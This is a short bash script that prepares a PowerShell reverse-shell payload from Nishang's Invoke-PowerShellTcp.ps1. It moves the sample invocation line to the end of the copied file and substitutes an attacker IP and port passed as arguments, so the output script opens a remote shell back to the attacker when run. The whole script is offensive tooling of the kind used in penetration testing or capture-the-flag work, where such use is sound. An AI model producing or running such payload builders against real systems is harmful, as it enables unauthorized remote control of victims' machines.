#!/bin/bash

ATTACKER=$1
PORT=$2

cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 nishang.ps1
# take the line, paste at end and remove "PS >"
ex -s -c 'g/Invoke.*Tcp -Rev.*192.168.254.226/m$' -c '$s/PS > //' -c wq nishang.ps1
# edit the IP
ex -s -c "\$s/192.168.254.226/$ATTACKER/" -c wq nishang.ps1
# edit the port
ex -s -c "\$s/4444/$PORT/" -c wq nishang.ps1

